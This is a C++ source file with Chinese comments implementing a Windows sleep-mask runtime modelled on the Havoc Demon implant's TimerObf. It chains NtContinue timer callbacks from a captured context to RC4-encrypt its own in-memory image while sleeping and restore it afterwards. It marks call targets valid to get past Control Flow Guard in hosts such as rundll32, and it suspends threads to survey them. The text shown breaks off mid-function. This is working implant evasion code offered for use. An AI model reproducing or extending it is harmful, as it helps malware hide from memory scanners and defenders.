/**
 * @file PlatformWin_MaskRuntime.cpp
 * @brief 睡眠掩码运行时 —— Windows 实现（TimerObf 式定时器链）
 * @details
 * 链结构对齐 Havoc Demon `payloads/Demon/src/core/Obf.c::TimerObf`，保留其两条核心机制：
 *
 *   ① **上下文返回槽**：`RtlCaptureContext` 以定时器回调身份捕获"派发器栈帧"的上下文；
 *      每个链步 `Rsp -= sizeof(void*)` 后，系统函数 `ret` 时弹出的正是"派发器返回地址"
 *      （捕获时刻栈上的原位值）——于是每个链步"像是被定时器派发器正常调用"，执行完
 *      干净地回到定时器基础设施。**不写任何自造返回地址**（Foliage 变体才需要显式写）。
 *   ② **加密/解密/等待全在镜像外执行**：链步目标只允许系统 DLL 直址
 *      （GetProcAddress 所得，ntdll/kernel32/cryptsp）——**严禁使用本镜像的 IAT thunk**：
 *      窗口内本镜像为密文，thunk 不可执行。链的参数数据（USTRING/密钥/写回槽）全部驻留
 *      调用线程栈与堆（不在被加密区）。
 *
 * 与 Havoc 的差异（有意）：
 *   - 不用 `WaitForSingleObjectEx(NtCurrentProcess(), Delay+TimeOut, ...)` 阻塞式"睡"步：
 *     改由**解密步的到期时间**承担过窗（`due = encrypt + window + gap`），全链零阻塞回调，
 *     不依赖定时器池"阻塞回调触发扩容"的行为（单线程池也成立）。
 *   - 加密延迟固定 1500ms（`kEncryptDelayMs`）：给主线程"排队 → SetEvent → 进等待"留余量，
 *     屏障步（等 EvStart）仍保留，作为单线程池下的第一道门。
 *   - 保护还原按 `VirtualQuery` 分段逐段恢复（Havoc 只还原 `.text`，其余留 RWX/RW）。
 *
 * 已知边界（P1）：
 *   - 需调用线程先保证"进程内无镜像内名单外线程"（`SelfTest` 以普查拒绝执行）；
 *   - 依赖 `SystemFunction032`（cryptsp/advapi32）可用性——预检失败即报告拒绝；
 *   - 不处理栈加密 / 堆加密。
 */
#include "Core/Mask/MaskRuntime.hpp"

#include <windows.h>

#include <algorithm>
#include <array>
#include <atomic>
#include <cstdint>
#include <string>
#include <vector>

// P1 调试追踪（探针构建用 /DCLEAT_MASK_TRACE 打开；主产物不定义）
#ifdef CLEAT_MASK_TRACE
#include <cstdio>
#define MASK_TRACE(...) do { std::fprintf(stderr, "[mask] " __VA_ARGS__); std::fprintf(stderr, "\n"); std::fflush(stderr); } while (0)
#else
#define MASK_TRACE(...) do { } while (0)
#endif

namespace cleat {
namespace {

#ifndef NDEBUG
    // MaskRuntime 保持 Logger-free(探针独立链接), 故用文件直写; Release 零编译。
    void MaskStepTrace(const char* s) {
        if (FILE* f = std::fopen("mask_step.log", "a")) {
            std::fputs(s, f);
            std::fputc('\n', f);
            std::fclose(f);
        }
    }
#else
    inline void MaskStepTrace(const char*) {}
#endif

    // ---------------- NT / 系统面类型 ----------------

    /// CFG_CALL_TARGET_INFO(winnt.h 有定义但 SDK 版本旧时缺失; 自定避免冲突)
    struct CFG_CALL_TARGET_INFO_S {
        ULONG_PTR Offset;
        ULONG_PTR Flags;
    };

    using NtStatus = LONG;
    inline bool NtOk(NtStatus s) { return s >= 0; }

    using FnRtlCreateTimerQueue = NtStatus(NTAPI*)(PHANDLE);
    /// 注意：RtlCreateTimer 第一参为**按值 HANDLE**（非 PHANDLE）；第二参才是 PHANDLE。
    /// 误传队列句柄指针会被当成无效句柄，在 ntdll 内部崩溃（P1 实测踩过）。
    using FnRtlCreateTimer = NtStatus(NTAPI*)(HANDLE, PHANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
    using FnRtlDeleteTimer = NtStatus(NTAPI*)(HANDLE, HANDLE, HANDLE);
    using FnRtlDeleteTimerQueue = NtStatus(NTAPI*)(HANDLE);
    using FnRtlCaptureContext = VOID(NTAPI*)(PCONTEXT);
    using FnNtContinue = NtStatus(NTAPI*)(PCONTEXT, BOOLEAN);
    using FnNtGetNextThread = NtStatus(NTAPI*)(HANDLE, HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
    using FnNtQueryInformationThread = NtStatus(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    using FnSystemFunction032 = NtStatus(NTAPI*)(PVOID, PVOID);   ///< (PUSTRING data, PUSTRING key) RC4
    using FnSystemFunction036 = BOOLEAN(WINAPI*)(PVOID, ULONG);   ///< RtlGenRandom
    using FnWaitForSingleObject = DWORD(WINAPI*)(HANDLE, DWORD);
    using FnVirtualProtect = BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD);
    using FnSetEvent = BOOL(WINAPI*)(HANDLE);
    using FnSetProcessValidCallTargets = BOOL(WINAPI*)(HANDLE, PVOID, SIZE_T, ULONG, PVOID);
    using FnGetProcessMitigationPolicy = BOOL(WINAPI*)(HANDLE, int, PVOID, SIZE_T);

    /// PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY(Flags 位 0 = EnableControlFlowGuard)
    constexpr int kProcessControlFlowGuardPolicy = 7;

    /// SystemFunction032 的 USTRING 形参（与 Havoc 同构；非 UNICODE_STRING）
    struct Ustring {
        ULONG Length;
        ULONG MaximumLength;
        PVOID Buffer;
    };

    /// NtQueryInformationThread 信息类（winternl.h 常量名的字面值）
    constexpr ULONG kThreadQuerySetWin32StartAddress = 9;

#ifdef WT_EXECUTEINTIMERTHREAD
    constexpr ULONG kTimerExecFlag = WT_EXECUTEINTIMERTHREAD;
#else
    constexpr ULONG kTimerExecFlag = 0x00000020UL;   ///< WT_EXECUTEINTIMERTHREAD
#endif

    // ---------------- 链时序常量（相对排队的毫秒） ----------------

    constexpr DWORD kCaptureDueMs = 100;          ///< 捕获上下文定时器
    constexpr DWORD kCaptureEventDueMs = 200;     ///< 捕获完成事件
    constexpr DWORD kBarrierDueMs = 100;          ///< 屏障（等 EvStart）
    constexpr DWORD kProtectRwDueMs = 200;        ///< 整镜像 → RW
    constexpr DWORD kEncryptDelayMs = 1500;       ///< 加密步延迟（给主线程入场余量）
    constexpr DWORD kStepGapMs = 100;             ///< 链步间隔
    constexpr uint32_t kMinWindowMs = 500;        ///< 窗口下限保护
    constexpr DWORD kDoneGuardMs = 15000;         ///< 主线程等待上限 = 窗口 + 该值

    /// 完整性判定的密文期抖动容忍(字节): 活进程本底 ~3B/s(CRT/openssl 静态状态),
    constexpr uint64_t kWindowChurnToleranceBytes = 64;

    // ---------------- 小工具 ----------------

    /// 模块内锚点：GetModuleHandleEx(FROM_ADDRESS) 用
    void MaskModuleAnchor() {}

    uint64_t Fnv1a64(const void* p, size_t n) {
        const uint8_t* b = static_cast<const uint8_t*>(p);
        uint64_t h = 14695981039346656037ULL;
        for (size_t i = 0; i < n; ++i) {
            h ^= b[i];
            h *= 1099511628211ULL;
        }
        return h;
    }

    /// 捕获完成事件回调（运行于定时器线程；窗口**之前**执行，镜像明文，允许调用本模块代码）
    VOID CALLBACK TimerSetEventCallback(PVOID param, BOOLEAN /*fired*/) {
        if (param) {
            ::SetEvent(static_cast<HANDLE>(param));
        }
    }

    // ---------------- 进程级持久定时器队列 ----------------

    /// **为什么必须持久**: RunWindow 若每窗创建+删除队列, ntdll 定时器池线程随之
    /// 出生/退出, 每次线程 attach/detach 都写静态 CRT 全局(__acrt_first_block 链表 /
    /// __acrt_current_request_number 计数) —— 真机实测这些写落在
    /// 密文窗口内, 直接打破镜像完整性(每窗确定性 ~15B 差异)。持久队列 + 首用预热
    /// 把线程生命周期事件全部钉在明文期, 窗口期线程集合稳定。
    struct PersistentQueue {
        std::atomic<HANDLE> handle{ nullptr };
        std::atomic<bool> warming{ false };
    };
    PersistentQueue g_pqueue;

    /// 镜像内 VirtualQuery 分段（保护还原用）
    struct ImageRegion {
        uint64_t addr = 0;
        uint64_t size = 0;
        DWORD protect = 0;
    };

    // ---------------- 解析面 ----------------

    struct WinApi {
        // ntdll
        FnRtlCreateTimerQueue RtlCreateTimerQueue = nullptr;
        FnRtlCreateTimer RtlCreateTimer = nullptr;
        FnRtlDeleteTimer RtlDeleteTimer = nullptr;
        FnRtlDeleteTimerQueue RtlDeleteTimerQueue = nullptr;
        FnRtlCaptureContext RtlCaptureContext = nullptr;
        FnNtContinue NtContinue = nullptr;
        FnNtGetNextThread NtGetNextThread = nullptr;
        FnNtQueryInformationThread NtQueryInformationThread = nullptr;
        // cryptsp / advapi32
        FnSystemFunction032 SystemFunction032 = nullptr;
        FnSystemFunction036 SystemFunction036 = nullptr;
        // kernel32（链步直址；窗口内不得经本镜像 IAT）
        FnWaitForSingleObject WaitForSingleObject = nullptr;
        FnVirtualProtect VirtualProtect = nullptr;
        FnSetEvent SetEvent = nullptr;
        // CFG: 进程 CFG 开启时(宿主带 GUARD_CF, 如 rundll32), ntdll 定时器
        // 派发器会对回调指针做 icall 校验; 无 CFG 位的目标(NtContinue stub 等)必 fast-fail。
        FnSetProcessValidCallTargets SetProcessValidCallTargets = nullptr;
        FnGetProcessMitigationPolicy GetProcessMitigationPolicy = nullptr;

        template <typename T>
        static bool Bind(HMODULE mod, const char* name, T& out) {
            if (!mod) {
                return false;
            }
            out = reinterpret_cast<T>(::GetProcAddress(mod, name));
            return out != nullptr;
        }

        /// 解析全部原语；false = 解析失败（missing = 首个缺失符号）
        bool Resolve(std::string& missing) {
            // 模块句柄：ntdll/kernel32 进程内必载；cryptsp/advapi32 按需加载
            auto loadModule = [](const wchar_t* name) -> HMODULE {
                HMODULE m = ::GetModuleHandleW(name);
                if (!m) {
                    m = ::LoadLibraryW(name);
                }
                return m;
            };
            HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
            HMODULE k32 = ::GetModuleHandleW(L"kernel32.dll");
            HMODULE adv = loadModule(L"advapi32.dll");
            HMODULE crypt = loadModule(L"cryptsp.dll");   // SystemFunction032 主来源；失败再回退 advapi32

            if (!Bind(ntdll, "RtlCreateTimerQueue", RtlCreateTimerQueue)) { missing = "ntdll!RtlCreateTimerQueue"; return false; }
            if (!Bind(ntdll, "RtlCreateTimer", RtlCreateTimer)) { missing = "ntdll!RtlCreateTimer"; return false; }
            if (!Bind(ntdll, "RtlDeleteTimer", RtlDeleteTimer)) { missing = "ntdll!RtlDeleteTimer"; return false; }
            if (!Bind(ntdll, "RtlDeleteTimerQueue", RtlDeleteTimerQueue)) { missing = "ntdll!RtlDeleteTimerQueue"; return false; }
            if (!Bind(ntdll, "RtlCaptureContext", RtlCaptureContext)) { missing = "ntdll!RtlCaptureContext"; return false; }
            if (!Bind(ntdll, "NtContinue", NtContinue)) { missing = "ntdll!NtContinue"; return false; }
            if (!Bind(ntdll, "NtGetNextThread", NtGetNextThread)) { missing = "ntdll!NtGetNextThread"; return false; }
            if (!Bind(ntdll, "NtQueryInformationThread", NtQueryInformationThread)) { missing = "ntdll!NtQueryInformationThread"; return false; }
            if (!Bind(crypt, "SystemFunction032", SystemFunction032) &&
                !Bind(adv, "SystemFunction032", SystemFunction032)) {
                missing = "cryptsp!SystemFunction032";
                return false;
            }
            if (!Bind(adv, "SystemFunction036", SystemFunction036)) { missing = "advapi32!SystemFunction036"; return false; }
            if (!Bind(k32, "WaitForSingleObject", WaitForSingleObject)) { missing = "kernel32!WaitForSingleObject"; return false; }
            if (!Bind(k32, "VirtualProtect", VirtualProtect)) { missing = "kernel32!VirtualProtect"; return false; }
            if (!Bind(k32, "SetEvent", SetEvent)) { missing = "kernel32!SetEvent"; return false; }
            // CFG 相关(kernelbase 优先; 缺失 = 老系统/未启用, 由 EnsureCallTargetsValid 处理)
            HMODULE kbase = loadModule(L"kernelbase.dll");
            Bind(kbase, "SetProcessValidCallTargets", SetProcessValidCallTargets) ||
                Bind(k32, "SetProcessValidCallTargets", SetProcessValidCallTargets);
            Bind(k32, "GetProcessMitigationPolicy", GetProcessMitigationPolicy);
            return true;
        }
    };

    // ---------------- 镜像枚举 ----------------

    bool EnsurePersistentQueue(const WinApi& api, std::string& err) {
        if (g_pqueue.handle.load(std::memory_order_acquire) != nullptr) {
            return true;
        }
        bool expect = false;
        if (!g_pqueue.warming.compare_exchange_strong(expect, true)) {
            // 别的线程在预热: 等它发布
            for (int i = 0; i < 200 && g_pqueue.handle.load(std::memory_order_acquire) == nullptr; ++i) {
                ::Sleep(10);
            }
            return g_pqueue.handle.load(std::memory_order_acquire) != nullptr;
        }
        HANDLE q = nullptr;
        if (!NtOk(api.RtlCreateTimerQueue(&q)) || !q) {
            g_pqueue.warming.store(false, std::memory_order_release);
            err = "RtlCreateTimerQueue 失败";
            return false;
        }
        // 预热: 两轮突发 1ms 定时器 + 等齐回调 —— 把定时器池线程全部拉起并完成
        // thread-attach(此时代码路径处于明文期, CRT 全局写无碍)。
        for (int round = 0; round < 2; ++round) {
            HANDLE ev = ::CreateEventW(nullptr, FALSE, FALSE, nullptr);
            if (!ev) {
                g_pqueue.warming.store(false, std::memory_order_release);
                err = "CreateEvent(预热) 失败";
                return false;
            }
            constexpr int kWarmTimers = 8;
            for (int i = 0; i < kWarmTimers; ++i) {
                HANDLE t = nullptr;
                if (!NtOk(api.RtlCreateTimer(q, &t, &TimerSetEventCallback, ev, 1, 0, kTimerExecFlag))) {
                    ::CloseHandle(ev);
                    g_pqueue.warming.store(false, std::memory_order_release);
                    err = "RtlCreateTimer(预热) 失败";
                    return false;
                }
            }
            if (::WaitForSingleObject(ev, 3000) != WAIT_OBJECT_0) {
                ::CloseHandle(ev);
                g_pqueue.warming.store(false, std::memory_order_release);
                err = "预热定时器未按时触发";
                return false;
            }
            ::CloseHandle(ev);
            ::Sleep(20);
        }
        g_pqueue.handle.store(q, std::memory_order_release);
        g_pqueue.warming.store(false, std::memory_order_release);
        return true;
    }

    /**
     * @brief CFG 间接调用目标标记
     * @details 进程 CFG 开启时(**宿主 EXE 带 GUARD_CF 即开启**, 与我们的产物无关 ——
     *          rundll32 / svchost / 多数系统宿主都是), ntdll 定时器派发器在执行
     *          `call [callback]` 前做 CFG icall 校验。我们链上的回调指针里
     *          `ntdll!NtContinue` 是 syscall stub(字节 `mov r10,rcx; mov eax,x; syscall; ret`),
     *          **没有 CFG 有效位** → `FAST_FAIL_GUARD_ICALL_CHECK_FAILURE(10)` →
     *          EXE 形态免疫仅因"我们的 EXE 未开 /guard:cf → 进程 CFG 关 → 校验短路"。
     *          修复 = 对每个回调目标调用 SetProcessValidCallTargets 标记其 16B 颗粒
     *          (**零新内存**: 只改进程 CFG 位图, 不加任何可执行页)。
     *          策略: 检测到 CFG 关 → 直接跳过(EXE 常态, 零开销); CFG 开 → 标记失败即
     *          拒绝执行(fail-closed: 否则回调派发必 fast-fail 崩)。
     */
    bool EnsureCallTargetsValid(const WinApi& api, std::string& err) {
        // 1) 进程 CFG 是否开启
        bool cfgOn = false;
        if (api.GetProcessMitigationPolicy) {
            DWORD policy = 0;   // PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY.Flags
            if (api.GetProcessMitigationPolicy(::GetCurrentProcess(),
                    kProcessControlFlowGuardPolicy, &policy, sizeof(policy))) {
                cfgOn = (policy & 0x1u) != 0;
            }
        }
        if (!cfgOn) {
            return true;   // CFG 关(EXE 常态): 校验短路, 无需标记
        }
        if (!api.SetProcessValidCallTargets) {
            err = "进程 CFG 开启但 SetProcessValidCallTargets 不可用(无法保证回调派发安全)";
            return false;
        }

        // 2) 目标集合 = 所有作为定时器回调传递的函数指针
        struct Target { uint64_t addr; const char* name; };
        const Target targets[] = {
            { reinterpret_cast<uint64_t>(api.NtContinue),          "ntdll!NtContinue" },
            { reinterpret_cast<uint64_t>(api.RtlCaptureContext),   "ntdll!RtlCaptureContext" },
            { reinterpret_cast<uint64_t>(api.WaitForSingleObject), "kernel32!WaitForSingleObject" },
            { reinterpret_cast<uint64_t>(api.VirtualProtect),      "kernel32!VirtualProtect" },
            { reinterpret_cast<uint64_t>(api.SetEvent),            "kernel32!SetEvent" },
            { reinterpret_cast<uint64_t>(api.SystemFunction032),   "cryptsp!SystemFunction032" },
        };
        const uint64_t pageSize = 0x1000;
        // 3) 逐目标标记(按页去重: 同页合并 offsets)
        //    页粒度 16B(CFG 位图颗粒): offset = 目标地址 & 0xFFF。
        std::vector<std::pair<uint64_t, std::vector<uint64_t>>> pages;   // {page, offsets}
        for (const Target& t : targets) {
            const uint64_t page = t.addr & ~(pageSize - 1);
            const uint64_t off = t.addr & (pageSize - 1);
            auto it = pages.begin();
            for (; it != pages.end(); ++it) {
                if (it->first == page) { it->second.push_back(off); break; }
            }
            if (it == pages.end()) {
                pages.push_back({ page, { off } });
            }
        }
        for (auto& pg : pages) {
            std::vector<CFG_CALL_TARGET_INFO_S> infos;
            infos.reserve(pg.second.size());
            for (uint64_t off : pg.second) {
                CFG_CALL_TARGET_INFO_S info{};
                info.Offset = off;
                info.Flags = 1u;   // CFG_CALL_TARGET_VALID
                infos.push_back(info);
            }
            if (!api.SetProcessValidCallTargets(::GetCurrentProcess(),
                    reinterpret_cast<PVOID>(pg.first), pageSize,
                    static_cast<ULONG>(infos.size()), infos.data())) {
                err = "CFG 标记失败(" + std::to_string(pg.second.size()) + " 个目标/页)";
                return false;
            }
        }
        return true;
    }

    bool BuildImage(MaskImageInfo& out, std::vector<ImageRegion>& regions, std::string& err) {
        HMODULE mod = nullptr;
        if (!::GetModuleHandleExW(
                GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                reinterpret_cast<LPCWSTR>(&MaskModuleAnchor), &mod) || !mod) {
            err = "GetModuleHandleEx(FROM_ADDRESS) 失败";
            return false;
        }
        const uint64_t base = reinterpret_cast<uint64_t>(mod);
        auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(mod);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            err = "镜像 DOS 头校验失败";
            return false;
        }
        auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + static_cast<uint64_t>(dos->e_lfanew));
        if (nt->Signature != IMAGE_NT_SIGNATURE ||
            nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            err = "镜像 NT 头校验失败(非 PE32+)";
            return false;
        }
        const uint64_t size = nt->OptionalHeader.SizeOfImage;
        if (size == 0 || size > (2ULL << 30)) {
            err = "SizeOfImage 异常";
            return false;
        }

        // VirtualQuery 分段（保护还原按段逐恢复；含 PE 头页与全部节）
        const uint64_t end = base + size;
        uint64_t cur = base;
        while (cur < end) {
            MEMORY_BASIC_INFORMATION mbi{};
            if (::VirtualQuery(reinterpret_cast<LPCVOID>(cur), &mbi, sizeof(mbi)) != sizeof(mbi)) {
                err = "VirtualQuery(镜像) 失败";
                return false;
            }
            uint64_t rstart = std::max<uint64_t>(reinterpret_cast<uint64_t>(mbi.BaseAddress), cur);
            uint64_t rend = reinterpret_cast<uint64_t>(mbi.BaseAddress) + mbi.RegionSize;
            if (rend > end) {
                rend = end;
            }
            if (rend <= rstart || regions.size() >= 32) {
                err = "镜像分段异常";
                return false;
            }
            regions.push_back(ImageRegion{ rstart, rend - rstart, mbi.Protect });
            cur = rend;
        }

        out.base = base;
        out.size = size;
        out.regionCount = static_cast<uint32_t>(regions.size());
        return true;
    }

    // ---------------- 线程普查 ----------------

    bool Census(const WinApi& api, const std::vector<uint32_t>& allowTids, const MaskImageInfo& img,
        std::vector<MaskThreadEntry>& out, int& foreign, int& unknown, std::string& err) {
        foreign = 0;
        unknown = 0;
        const DWORD selfTid = ::GetCurrentThreadId();
        // 进程创建时刻(诊断: createdDeltaMs 定位"漏网线程是谁拉起来的")
        FILETIME pc{}, pe{}, pk{}, pu{};
        const bool haveProc = ::GetProcessTimes(::GetCurrentProcess(), &pc, &pe, &pk, &pu) != FALSE;
        HANDLE cur = nullptr;
        for (;;) {
            HANDLE next = nullptr;
            const NtStatus st = api.NtGetNextThread(::GetCurrentProcess(), cur,
                THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION |
                THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, 0, 0, &next);
            if (!NtOk(st)) {
                break;
            }
            if (cur) {
                ::CloseHandle(cur);
            }
            cur = next;

            MaskThreadEntry e{};
            e.tid = ::GetThreadId(cur);
            ULONG_PTR saddr = 0;
            ULONG retLen = 0;
            if (NtOk(api.NtQueryInformationThread(cur, kThreadQuerySetWin32StartAddress,
                    &saddr, sizeof(saddr), &retLen)) && retLen == sizeof(saddr)) {
                e.startAddress = static_cast<uint64_t>(saddr);
            }
            e.inOwnImage = e.startAddress >= img.base && e.startAddress < img.base + img.size;
            e.isSelf = (e.tid == selfTid);
            for (uint32_t t : allowTids) {
                if (t == e.tid) {
                    e.allowlisted = true;
                    break;
                }
            }
            if (haveProc) {
                FILETIME tc{}, te{}, tk{}, tu{};
                if (::GetThreadTimes(cur, &tc, &te, &tk, &tu)) {
                    ULARGE_INTEGER tcc{}, pcc{};
                    tcc.LowPart = tc.dwLowDateTime;
                    tcc.HighPart = tc.dwHighDateTime;
                    pcc.LowPart = pc.dwLowDateTime;
                    pcc.HighPart = pc.dwHighDateTime;
                    e.createdDeltaMs = (tcc.QuadPart < pcc.QuadPart)
                        ? 0
                        : static_cast<int64_t>((tcc.QuadPart - pcc.QuadPart) / 10000ULL);
                }
            }
            // RIP 快照(诊断): 挂起 → 取 CONTEXT_CONTROL → 立即恢复。跳过自身
            // (SuspendThread 自挂起 = 自锁死)与查询失败的线程。
            if (!e.isSelf) {
                if (::SuspendThread(cur) != static_cast<DWORD>(-1)) {
                    CONTEXT cx{};
                    cx.ContextFlags = CONTEXT_CONTROL;
                    if (::GetThreadContext(cur, &cx)) {
                        e.ripSnapshot = cx.Rip;
                        e.ripImageOffset = (cx.Rip >= img.base && cx.Rip < img.base + img.size)
                            ? (cx.Rip - img.base) : 0;
                    }
                    ::ResumeThread(cur);
                }
            }
            if (e.startAddress == 0) {
                ++unknown;
            } else if (e.inOwnImage && !e.allowlisted && !e.isSelf) {
                ++foreign;
            }
            out.push_back(e);
        }
        if (cur) {
            ::CloseHandle(cur);
        }
        if (out.empty()) {
            err = "线程普查为空(NtGetNextThread 异常)";
            return false;
        }
        return true;
    }

    uint64_t HashImage(const MaskImageInfo& img) {
        return Fnv1a64(reinterpret_cast<const void*>(img.base), static_cast<size_t>(img.size));
    }

    // ---------------- RC4 往返自检 ----------------

    bool Rc4RoundTrip(const WinApi& api, std::string& err) {
        std::array<uint8_t, 256> buf{};
        for (size_t i = 0; i < buf.size(); ++i) {
            buf[i] = static_cast<uint8_t>(i * 7 + 1);
        }
        std::array<uint8_t, 16> key{};
        if (!api.SystemFunction036(key.data(), static_cast<ULONG>(key.size()))) {
            err = "RtlGenRandom(SystemFunction036) 失败";
            return false;
        }
        Ustring data{ static_cast<ULONG>(buf.size()), static_cast<ULONG>(buf.size()), buf.data() };
        Ustring k{ static_cast<ULONG>(key.size()), static_cast<ULONG>(key.size()), key.data() };

        const std::array<uint8_t, 256> plain = buf;
        if (!NtOk(api.SystemFunction032(&data, &k))) {
            err = "SystemFunction032(加密) 调用失败";
            return false;
        }
        const bool differs = (buf != plain);
        if (!NtOk(api.SystemFunction032(&data, &k))) {
            err = "SystemFunction032(解密) 调用失败";
            return false;
        }
        const bool restored = (buf == plain);
        if (!differs || !restored) {
            err = "RC4 往返校验失败";
            return false;
        }
        return true;
    }

    // ---------------- 窗口执行 ----------------

    /**
     * @brief 执行一次掩码窗口（调用线程 = "睡眠者"，必须已确认全静默）
     * @return true = 完成（窗口已过且镜像已解密）；false = 未完成（err 给原因；
     *         失败集中在"链构建/排队阶段"，此时镜像尚未被加密）
     */
    bool RunWindow(const WinApi& api, const MaskImageInfo& img, const std::vector<ImageRegion>& regions,
        uint32_t windowMs, std::string& err, uint64_t& elapsedMs,
        std::vector<uint8_t>* preQueueSnap = nullptr) {
        elapsedMs = 0;

        // 资源守卫：任何早退路径自动回收（定时器摘除 + 句柄关闭; 队列为进程级持久,
        // 不在此删除 —— 见 EnsurePersistentQueue 的完整性论证）
        struct Guard {
            const WinApi* api = nullptr;
            HANDLE queue = nullptr;
            HANDLE ev[3] = { nullptr, nullptr, nullptr };
            std::vector<HANDLE> timers;   ///< 本窗排队的定时器(一次性, 用毕摘除防残留)
            ~Guard() {
                if (queue && api && api->RtlDeleteTimer) {
                    for (HANDLE t : timers) {
                        api->RtlDeleteTimer(queue, t, nullptr);   // 已触发的一次性项, 同步摘除
                    }
                }
                for (HANDLE h : ev) {
                    if (h) {
                        ::CloseHandle(h);
                    }
                }
            }
        } guard{ &api };
        guard.ev[0] = ::CreateEventW(nullptr, FALSE, FALSE, nullptr);   // 捕获完成
        guard.ev[1] = ::CreateEventW(nullptr, FALSE, FALSE, nullptr);   // 屏障放行
        guard.ev[2] = ::CreateEventW(nullptr, FALSE, FALSE, nullptr);   // 窗口完成
        if (!guard.ev[0] || !guard.ev[1] || !guard.ev[2]) {
            err = "CreateEvent 失败";
            return false;
        }
        if (!EnsurePersistentQueue(api, err)) {
            return false;
        }
        guard.queue = g_pqueue.handle.load(std::memory_order_acquire);
        MASK_TRACE("events+persistent queue ready");
        MaskStepTrace("step: queue+events ready");

        // ---- ① 捕获定时器线程上下文 + 捕获完成事件 ----
        CONTEXT captured{};
        captured.ContextFlags = CONTEXT_FULL;
        HANDLE timer = nullptr;
        if (!NtOk(api.RtlCreateTimer(guard.queue, &timer,
                reinterpret_cast<WAITORTIMERCALLBACK>(api.RtlCaptureContext),
                &captured, kCaptureDueMs, 0, kTimerExecFlag))) {
            err = "RtlCreateTimer(捕获上下文) 失败";
            return false;
        }
        guard.timers.push_back(timer);
        if (!NtOk(api.RtlCreateTimer(guard.queue, &timer,
                &TimerSetEventCallback, guard.ev[0], kCaptureEventDueMs, 0, kTimerExecFlag))) {
            err = "RtlCreateTimer(捕获事件) 失败";
            return false;
        }
        guard.timers.push_back(timer);
        MaskStepTrace("step: capture timers queued");
        MASK_TRACE("capture timers queued, waiting capture event");
        if (::WaitForSingleObject(guard.ev[0], 3000) != WAIT_OBJECT_0) {
            err = "等待上下文捕获超时";
            return false;
        }
        MaskStepTrace("step: context captured");
        MASK_TRACE("context captured: rip=0x%llX rsp=0x%llX",
            static_cast<unsigned long long>(captured.Rip),
            static_cast<unsigned long long>(captured.Rsp));

        // ---- ② 构建链步 ----
        // 关键：每个上下文 Rsp = 捕获值 - sizeof(void*)（返回槽 = 派发器返回地址原位值）；
        //       链步目标 = 系统 DLL 直址；参数在调用线程栈/堆（见文件头）。
        std::vector<CONTEXT> rops;
        rops.reserve(8 + regions.size());
        DWORD vpScratch = 0;   // VirtualProtect 第 4 参写回槽（栈）
        Ustring imgDesc;
        imgDesc.Length = imgDesc.MaximumLength = static_cast<ULONG>(img.size);
        imgDesc.Buffer = reinterpret_cast<PVOID>(img.base);
        std::array<uint8_t, 16> key{};
        if (!api.SystemFunction036(key.data(), static_cast<ULONG>(key.size()))) {
            err = "RtlGenRandom 失败";
            return false;
        }
        Ustring keyDesc;
        keyDesc.Length = keyDesc.MaximumLength = static_cast<ULONG>(key.size());
        keyDesc.Buffer = key.data();

        auto addStep = [&](uint64_t fn, uint64_t rcx, uint64_t rdx, uint64_t r8, uint64_t r9) {
            CONTEXT c = captured;
            c.ContextFlags = CONTEXT_FULL;
            c.Rip = fn;
            c.Rsp = captured.Rsp - sizeof(void*);
            c.Rcx = rcx;
            c.Rdx = rdx;
            c.R8 = r8;
            c.R9 = r9;
            rops.push_back(c);
        };

        // s0 屏障：等主线程 SetEvent(EvStart)（单线程池下作为第一道门；多线程池下 1500ms 余量兜底）
        addStep(reinterpret_cast<uint64_t>(api.WaitForSingleObject),
            reinterpret_cast<uint64_t>(guard.ev[1]), INFINITE, 0, 0);
        // s1 整镜像 → RW
        addStep(reinterpret_cast<uint64_t>(api.VirtualProtect),
            img.base, img.size, PAGE_READWRITE, reinterpret_cast<uint64_t>(&vpScratch));
        // s2 加密（RC4 整镜像）
        addStep(reinterpret_cast<uint64_t>(api.SystemFunction032),
            reinterpret_cast<uint64_t>(&imgDesc), reinterpret_cast<uint64_t>(&keyDesc), 0, 0);
        // s3 解密（RC4 对称；到期时间承担"过窗"）
        addStep(reinterpret_cast<uint64_t>(api.SystemFunction032),
            reinterpret_cast<uint64_t>(&imgDesc), reinterpret_cast<uint64_t>(&keyDesc), 0, 0);
        // s4.. 分段还原保护
        for (const ImageRegion& r : regions) {
            addStep(reinterpret_cast<uint64_t>(api.VirtualProtect),
                r.addr, r.size, r.protect, reinterpret_cast<uint64_t>(&vpScratch));
        }
        // sN 窗口完成事件
        addStep(reinterpret_cast<uint64_t>(api.SetEvent),
            reinterpret_cast<uint64_t>(guard.ev[2]), 0, 0, 0);

        // ---- ③ 排队（dues 相对各次调用时刻；调用背靠背，视为近绝对时序） ----
        const DWORD encDue = kEncryptDelayMs;
        const DWORD decDue = encDue + static_cast<DWORD>(windowMs) + kStepGapMs;
        const DWORD restoreBase = decDue;
        const DWORD doneDue = restoreBase + kStepGapMs * (static_cast<DWORD>(regions.size()) + 1);

        struct Queued { size_t idx; DWORD due; };
        std::vector<Queued> plan;
        plan.push_back({ 0, kBarrierDueMs });
        plan.push_back({ 1, kProtectRwDueMs });
        plan.push_back({ 2, encDue });
        plan.push_back({ 3, decDue });
        for (size_t i = 0; i < regions.size(); ++i) {
            plan.push_back({ 4 + i, restoreBase + kStepGapMs * static_cast<DWORD>(i + 1) });
        }
        plan.push_back({ 4 + regions.size(), doneDue });

        for (const Queued& q : plan) {
            HANDLE t = nullptr;
            if (!NtOk(api.RtlCreateTimer(guard.queue, &t,
                    reinterpret_cast<WAITORTIMERCALLBACK>(api.NtContinue),
                    &rops[q.idx], q.due, 0, kTimerExecFlag))) {
                err = "RtlCreateTimer(链步) 失败";
                return false;
            }
            guard.timers.push_back(t);
        }
